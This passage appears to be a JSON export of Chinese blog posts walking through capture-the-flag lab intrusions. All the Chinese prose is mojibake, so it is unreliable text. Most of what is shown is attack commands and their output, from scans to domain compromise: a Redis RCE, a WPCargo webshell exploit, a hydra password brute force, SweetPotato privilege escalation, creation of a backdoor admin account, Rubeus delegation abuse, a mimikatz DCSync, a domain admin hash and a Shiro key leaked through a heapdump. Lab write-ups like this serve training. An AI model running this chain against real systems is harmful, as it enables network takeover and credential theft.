æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-04-15 02:37:33] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.231.184:6379[2025-04-15 02:37:33] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.231.184:80[2025-04-15 02:37:33] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.231.184:21[2025-04-15 02:37:33] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.231.184:22[2025-04-15 02:37:33] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.231.184:21 =&gt; [ftp] ç‰ˆæœ¬:3.0.2 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.2).][2025-04-15 02:37:34] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.231.184:22 =&gt; [ssh] ç‰ˆæœ¬:7.4 äº§å“:OpenSSH ä¿¡æ¯:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.][2025-04-15 02:37:38] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.231.184:6379 =&gt; [redis] ç‰ˆæœ¬:5.0.12 äº§å“:Redis key-value store[2025-04-15 02:37:39] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.231.184:80 =&gt; [http] ç‰ˆæœ¬:1.20.1 äº§å“:nginx[2025-04-15 02:37:43] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 4[2025-04-15 02:37:43] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-04-15 02:37:43] [INFO] åŠ è½½çš„æ’ä»¶: ftp, redis, ssh, webpoc, webtitle[2025-04-15 02:37:43] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.231.184 çŠ¶æ€ç :200 é•¿åº¦:4833 æ ‡é¢˜:Welcome to CentOS[2025-04-15 02:37:44] [SUCCESS] åŒ¿åç™»å½•æˆåŠŸ![2025-04-15 02:37:46] [SUCCESS] Redis 39.99.231.184:6379 å‘ç°æœªæˆæƒè®¿é—® æ–‡ä»¶ä½ç½®:/usr/local/redis/db/dump.rdb[2025-04-15 02:37:50] [SUCCESS] Redisæ— å¯†ç è¿æ¥æˆåŠŸ: 39.99.231.184:6379[2025-04-15 02:37:53] [SUCCESS] æ‰«æå·²å®Œæˆ: 5/5 æ‰“redisä¸»ä»å¤åˆ¶rceï¼Œflagåœ¨/home/redis/flagä¸‹ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™è¯»ï¼Œbase64å…·æœ‰suidæƒé™ï¼Œå¯ä»¥ç”¨base64è¯»å– 1/usr/bin/base64 ./flag01|/usr/bin/base64 -d ftpæœåŠ¡åªæœ‰ä¸€ä¸ªpubæ–‡ä»¶å¤¹ï¼Œæ²¡ä»€ä¹ˆç”¨ï¼Œä¸Šä¼ fscanæ‰«æä¸€ä¸‹å†…ç½‘ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106./fscan -h 172.22.2.7/24â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-04-15 15:22:58] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-04-15 15:22:58] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-04-15 15:22:58] [INFO] CIDRèŒƒå›´: 172.22.2.0-172.22.2.255[2025-04-15 15:22:58] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)[2025-04-15 15:22:58] [INFO] è§£æCIDR 172.22.2.7/24 -&gt; IPèŒƒå›´ 172.22.2.0-172.22.2.255[2025-04-15 15:22:58] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256[2025-04-15 15:22:58] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-04-15 15:22:58] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹...[2025-04-15 15:22:58] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ…[2025-04-15 15:22:58] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹...[2025-04-15 15:22:58] [SUCCESS] ç›®æ ‡ 172.22.2.3 å­˜æ´» (ICMP)[2025-04-15 15:22:58] [SUCCESS] ç›®æ ‡ 172.22.2.7 å­˜æ´» (ICMP)[2025-04-15 15:22:58] [SUCCESS] ç›®æ ‡ 172.22.2.16 å­˜æ´» (ICMP)[2025-04-15 15:22:58] [SUCCESS] ç›®æ ‡ 172.22.2.18 å­˜æ´» (ICMP)[2025-04-15 15:22:59] [SUCCESS] ç›®æ ‡ 172.22.2.34 å­˜æ´» (ICMP)[2025-04-15 15:23:04] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 5[2025-04-15 15:23:04] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:88[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:80[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:80[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:80[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:22[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:22[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:21[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:139[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:139[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.34:135[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:135[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:139[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:135[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.34:445[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:445[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:445[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:445[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:389[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.34:139[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:1433[2025-04-15 15:23:04] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:6379[2025-04-15 15:23:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-15 15:23:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:22 =&gt; [ssh] ç‰ˆæœ¬:7.4 äº§å“:OpenSSH ä¿¡æ¯:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.][2025-04-15 15:23:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:21 =&gt; [ftp] ç‰ˆæœ¬:3.0.2 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.2).][2025-04-15 15:23:09] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:88 =&gt; [2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:80 =&gt; [http] ç‰ˆæœ¬:2.0 äº§å“:Microsoft HTTPAPI httpd ç³»ç»Ÿ:Windows[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:80 =&gt; [http] ç‰ˆæœ¬:1.20.1 äº§å“:nginx[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:139 =&gt; Banner:[.][2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:139 =&gt; Banner:[.][2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:80 =&gt; [http][2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.34:445 =&gt; [2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:445 =&gt; [2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:445 =&gt; [2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:389 =&gt; [ldap] äº§å“:Microsoft Windows Active Directory LDAP ç³»ç»Ÿ:Windows ä¿¡æ¯:Domain: xiaorang.lab, Site: Default-First-Site-Name[2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.34:139 =&gt; Banner:[.][2025-04-15 15:23:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:1433 =&gt; [ms-sql-s] ç‰ˆæœ¬:13.00.4001; SP1 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.][2025-04-15 15:24:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:139 =&gt; [2025-04-15 15:24:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:445 =&gt; [2025-04-15 15:24:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:6379 =&gt; [2025-04-15 15:24:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.34:135 =&gt; [2025-04-15 15:24:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:135 =&gt; [2025-04-15 15:24:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:135 =&gt; [2025-04-15 15:24:10] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 21[2025-04-15 15:24:10] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-04-15 15:24:10] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-04-15 15:24:10] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.2.34ä¸»æœºå: CLIENT01å‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.22.2.34[2025-04-15 15:24:10] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.2.3ä¸»æœºå: DCå‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.22.2.3[2025-04-15 15:24:10] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.2.16ä¸»æœºå: MSSQLSERVERå‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.22.2.16[2025-04-15 15:24:10] [INFO] ç³»ç»Ÿä¿¡æ¯ 172.22.2.3 [Windows Server 2016 Datacenter 14393][2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.34 XIAORANG\\CLIENT01 [2025-04-15 15:24:10] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.2.16 çŠ¶æ€ç :404 é•¿åº¦:315 æ ‡é¢˜:Not Found[2025-04-15 15:24:10] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.2.7 çŠ¶æ€ç :200 é•¿åº¦:4833 æ ‡é¢˜:Welcome to CentOS[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.3 DC:DC.xiaorang.lab Windows Server 2016 Datacenter 14393[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server 2016 Datacenter 14393[2025-04-15 15:24:10] [INFO] ç³»ç»Ÿä¿¡æ¯ 172.22.2.16 [Windows Server 2016 Datacenter 14393][2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.18 WORKGROUP\\UBUNTU-WEB02 [2025-04-15 15:24:10] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable[2025-04-15 15:24:10] [SUCCESS] åŒ¿åç™»å½•æˆåŠŸ![2025-04-15 15:24:10] [SUCCESS] SMBè®¤è¯æˆåŠŸ 172.22.2.18:445 administrator:123456[2025-04-15 15:24:10] [INFO] SMB2å…±äº«ä¿¡æ¯ 172.22.2.18:445 administrator Pass:123456 å…±äº«:[print$ IPC$][2025-04-15 15:24:10] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.2.18 çŠ¶æ€ç :200 é•¿åº¦:57738 æ ‡é¢˜:åˆä¸€ä¸ªWordPressç«™ç‚¹[2025-04-15 15:24:12] [INFO] SMB2å…±äº«ä¿¡æ¯ 172.22.2.16:445 admin Pass:123456 å…±äº«:[ADMIN$ C$ fileshare IPC$][2025-04-15 15:24:18] [SUCCESS] SMBè®¤è¯æˆåŠŸ 172.22.2.16:445 admin:123456 æ‰«åˆ°ä¸€å †å“¦ä¸€ä¸ªä¸€ä¸ªçœ‹ï¼Œ172.22.2.18çš„80ç«¯å£æ˜¯ä¸€ä¸ªwpsï¼Œç”¨wpscanæ‰«ä¸€ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556[i] Plugin(s) Identified:[+] wpcargo | Location: http://172.22.2.18/wp-content/plugins/wpcargo/ | Last Updated: 2024-08-08T17:00:00.000Z | [!] The version is out of date, the latest version is 7.0.6 | | Found By: Urls In Homepage (Passive Detection) | | [!] 6 vulnerabilities identified: | | [!] toc: truetitle: WPCargo &lt; 6.9.0 - Unauthenticated RCE | Fixed in: 6.9.0 | References: | - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003 | | [!] toc: truetitle: WPCargo Track &amp; Trace &lt; 6.9.5 - Reflected Cross Site Scripting | Fixed in: 6.9.5 | References: | - https://wpscan.com/vulnerability/d5c6f894-6ad1-46f4-bd77-17ad9234cfc3 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1436 | | [!] toc: truetitle: WPCargo Track &amp; Trace &lt; 6.9.5 - Admin+ Stored Cross Site Scripting | Fixed in: 6.9.5 | References: | - https://wpscan.com/vulnerability/ef5aa8a7-23a7-4ce0-bb09-d9c986386114 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1435 | | [!] toc: truetitle: WPCargo Track &amp; Trace &lt;= 7.0.6 - Unauthenticated SQL Injection | References: | - https://wpscan.com/vulnerability/f5fdb762-cbc1-4352-9ab2-cbba9d3d33e2 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44004 | - https://www.wordfence.com/threat-intel/vulnerabilities/id/0e725ec0-4897-4ba7-a803-80e8aafacbd1 | | [!] toc: truetitle: WPCargo Track &amp; Trace &lt;= 7.0.6 - Missing authorization to Authenticated (Subscriber+) Settings Update | References: | - https://wpscan.com/vulnerability/b433fff9-b501-4fb3-9f04-5e18b64b0a90 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-54271 | - https://www.wordfence.com/threat-intel/vulnerabilities/id/0c467a78-1ba4-4c0d-84e6-db54fc1b0c63 | | [!] toc: truetitle: WPCargo Track &amp; Trace &lt;= 7.0.6 - Authenticated (Contributor+) Insecure Direct Object Reference | References: | - https://wpscan.com/vulnerability/594ae221-06b6-4bc2-b5b6-0f9bac880f7b | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-31609 | - https://www.wordfence.com/threat-intel/vulnerabilities/id/887ecedb-0bc8-4488-b6fa-27cfa22345e6 | | Version: 6.x.x (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt å­˜åœ¨wpcargoæ’ä»¶ï¼Œæœ‰ä¸€ä¸ªrceçš„æ¼æ´https://github.com/biulove0x/CVE-2021-25003 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# python3 2 -t &quot;http://172.22.2.18/&quot;[proxychains] DLL init: proxychains-ng 4.17############################################# @author : biulove0x ## @name : WP Plugins WPCargo Exploiter ## @cve : CVE-2021-25003 #############################################[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.22.2.18:80 ... OK[-] http://172.22.2.18/wp-content/wp-conf.php =&gt; Uploaded! èšå‰‘è¿æ¥ï¼Œå¯ä»¥æ‹¿åˆ°æ•°æ®åº“çš„å¯†ç  flag2åœ¨æ•°æ®åº“é‡Œ FLAG3åœ¨å¦ä¸€å¼ è¡¨é‡Œæœ‰å¾ˆå¤šå¯†ç  æ˜¯172.22.2.16 msssqlæ•°æ®åº“çš„å¯†ç æœ¬ï¼Œç„¶ååŠ¨æ‰‹çˆ†ç ´ï¼Œmssqlçš„é»˜è®¤ç”¨æˆ·åæ˜¯saï¼Œå› ä¸ºå¯¼å‡ºæ¥çš„æœ‰ç©ºæ ¼ï¼Œæ‰€ä»¥æŠŠå‰é¢çš„ç©ºæ ¼å¤„ç†æ‰ 1â””â”€# grep -P &quot;\\w+&quot; pass -o &gt;2 12â””â”€# hydra -l sa -P pass 172.22.2.16 mssql -f -I -vV[1433][mssql] host: 172.22.2.16 login: sa password: ElGNkOiC ç„¶åç”¨MDUTè¿æ¥ ä¸Šä¼ sweetpotato.exeç„¶åææƒ flag03åœ¨C:\\Users\\Administrator\\flag\\ä¸‹ 1C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;type C:\\Users\\Administrator\\flag\\flag03.txt&quot; FLAG4netstat -anoå‘ç°å¼€å¯äº†3389 123456789101112TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 692 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING 2680 TCP 0.0.0.0:2383 0.0.0.0:0 LISTENING 2932 TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 812 æ·»åŠ ä¸€ä¸ªç”¨æˆ· 12C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;net user lv Asd123123 /add&quot;C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;net localgroup administrators lv /add&quot; ç„¶åè¿œç¨‹æ¡Œé¢ç™»å½• å¯ä»¥å‘ç°æœ‰åŸŸç¯å¢ƒï¼Œå…ˆä¸Šä¼ mimikatzæå–hashï¼Œä¸Šä¼ bloodhoundå¯ä»¥å‘ç°æœ‰çº¦æŸæ€§å§”æ´¾ è·å–åˆ°åŸŸç”¨æˆ·çš„å“ˆå¸Œä¸ºcea3e66a2715c71423e7d3f0ff6cd352 é€šè¿‡Rubeusç”³è¯·æœºå™¨è´¦æˆ·MSSQLSERVERçš„TGTï¼Œæ‰§è¡Œåï¼Œå°†å¾—åˆ° Base64 åŠ å¯†åçš„ TGT ç¥¨æ® 1Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:cea3e66a2715c71423e7d3f0ff6cd352 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap ç„¶åä½¿ç”¨ S4U2Self æ‰©å±•ä»£è¡¨åŸŸç®¡ç†å‘˜ Administrator è¯·æ±‚é’ˆå¯¹åŸŸæ§ LDAP æœåŠ¡çš„ç¥¨æ®ï¼Œå¹¶å°†å¾—åˆ°çš„ç¥¨æ®ä¼ é€’åˆ°å†…å­˜ä¸­ 1Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:[base64(ticket.kirbi)] LDAPæœåŠ¡å…·æœ‰DCSyncæƒé™ï¼Œå¯ä»¥å¯¼å‡ºåŸŸå†…ç”¨æˆ·å“ˆå¸Œ 1mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit å¾—åˆ°åŸŸç®¡çš„å“ˆå¸Œä¸º1a19251fbd935969832616366ae3fe62 ç„¶åå°±å¯ä»¥ç”¨WMIæœåŠ¡ç™»å½•åŸŸæ§ï¼Œflagåœ¨C:\\Users\\Administrator\\flagä¸‹","categories":[{"name":"æ˜¥ç§‹äº‘é•œ","slug":"æ˜¥ç§‹äº‘é•œ","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"æ˜¥ç§‹äº‘é•œ-Hospital","slug":"æ˜¥ç§‹äº‘é•œ-Hospital","date":"2025-04-10T08:46:51.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/04/10/æ˜¥ç§‹äº‘é•œ-Hospital/","permalink":"https://lvzhouhang.xyz/2025/04/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/","excerpt":"","text":"flag01é¦–å…ˆæ‰«æä¸€ä¸‹ç«¯å£ï¼Œæœ‰ä¸€ä¸ª22ç«¯å£å’Œ8080ç«¯å£ï¼Œç„¶åç”¨fscanå¯¹è¿™ä¸¤ä¸ªç«¯å£è¿›è¡Œæ‰«æï¼Œå¯ä»¥æ‰«åˆ°ä¸€ä¸ªheapdumpæ³„éœ² 1234567891011121314151617181920â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# ../pentest/fscan/fscan -h 39.99.232.64 -p 8080 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt;\\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscan39.99.232.64:8080 open[*] alive ports len is: 1start vulscan[*] WebTitle http://39.99.232.64:8080 code:302 len:0 toc: truetitle:None è·³è½¬url: http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD[*] WebTitle http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD code:200 len:2005 toc: truetitle:åŒ»ç–—ç®¡ç†åå°[+] PocScan http://39.99.232.64:8080 poc-yaml-spring-actuator-heapdump-fileå·²å®Œæˆ 1/1[*] æ‰«æç»“æŸ,è€—æ—¶: 6.890674118s è®¿é—®/actuator/heapdumpï¼Œå¥–heapdumpä¸‹è½½ä¸‹äº†ï¼Œç„¶åç”¨JDumpSpideråˆ†æ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237E:\\CTF\\heapdump via â˜• v17.0.11â¯ java -jar .\\JDumpSpider-1.1-SNAPSHOT-full.jar .\\heapdump===========================================SpringDataSourceProperties-------------not found!===========================================WeblogicDataSourceConnectionPoolConfig-------------not found!===========================================MongoClient-------------not found!===========================================AliDruidDataSourceWrapper-------------not found!===========================================HikariDataSource-------------not found!===========================================RedisStandaloneConfiguration-------------not found!===========================================JedisClient-------------not found!===========================================CookieRememberMeManager(ShiroKey)-------------algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES===========================================OriginTrackedMapPropertySource-------------management.endpoints.web.exposure.include = *server.port = 8080spring.thymeleaf.prefix = classpath:/templates/===========================================MutablePropertySources-------------awt.toolkit = sun.awt.X11.XToolkitsun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs = org.springframework.boot.loadersun.management.compiler = HotSpot 64-Bit Tiered Compilerssun.cpu.isalist =sun.jnu.encoding = UTF-8java.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08java.class.path = /app/login-1.0-SNAPSHOT.jarpath.separator = :java.vm.vendor = Private Buildos.version = 5.4.0-164-genericjava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedjava.runtime.name = OpenJDK Runtime Environmentfile.encoding = UTF-8catalina.useNaming = falsespring.beaninfo.ignore = truejava.vm.specification.version = 1.8os.name = Linuxjava.vm.name = OpenJDK 64-Bit Server VMlocal.server.port = nulluser.country = USjava.vendor.url.bug = http://bugreport.sun.com/bugreport/sun.java.command = /app/login-1.0-SNAPSHOT.jarjava.io.tmpdir = /tmpcatalina.home = /tmp/tomcat.5978727065775558529.8080java.version = 1.8.0_392user.home = /home/appuser.language = enPID = 750java.awt.printerjob = sun.print.PSPrinterJobfile.separator = /catalina.base = /tmp/tomcat.5978727065775558529.8080java.vm.info = mixed modejava.specification.name = Java Platform API Specificationjava.vm.specification.vendor = Oracle Corporationjava.awt.graphicsenv = sun.awt.X11GraphicsEnvironmentjava.awt.headless = truesun.io.unicode.encoding = UnicodeLittlejava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext===========================================MapPropertySources-------------local.server.port = null===========================================ConsulPropertySources-------------not found!===========================================JavaProperties-------------java.util.logging.FileHandler.pattern = %h/java%u.logawt.toolkit = sun.awt.X11.XToolkitsun.cpu.isalist =sun.jnu.encoding = UTF-8sun.arch.data.model = 64catalina.useNaming = falsesecurity.overridePropertiesFile = truesun.boot.library.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64security.provider.7 = com.sun.security.sasl.Providersun.java.command = /app/login-1.0-SNAPSHOT.jarsecurity.provider.9 = sun.security.smartcardio.SunPCSCjava.specification.vendor = Oracle Corporationsecurity.provider.1 = sun.security.provider.Sunsecurity.provider.2 = sun.security.rsa.SunRsaSignsecurity.provider.3 = sun.security.ec.SunECnetworkaddress.cache.negative.ttl = 10security.provider.4 = com.sun.net.ssl.internal.ssl.Providersecurity.provider.5 = com.sun.crypto.provider.SunJCEsecurity.provider.6 = sun.security.jgss.SunProviderfile.separator = /org.springframework.web.servlet.HandlerExceptionResolver = org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver,org.springframework.web.servlet.mvc.annotation.ResponseStatusExceptionResolver,org.springframework.web.servlet.mvc.support.DefaultHandlerExceptionResolverjava.specification.name = Java Platform API Specificationjava.vm.specification.vendor = Oracle Corporationorg.springframework.web.servlet.HandlerMapping = org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,org.springframework.web.servlet.function.support.RouterFunctionMappingorg.springframework.web.servlet.HandlerAdapter = org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter,org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter,org.springframework.web.servlet.function.support.HandlerFunctionAdapterorg.springframework.web.servlet.FlashMapManager = org.springframework.web.servlet.support.SessionFlashMapManagerpackage.definition = 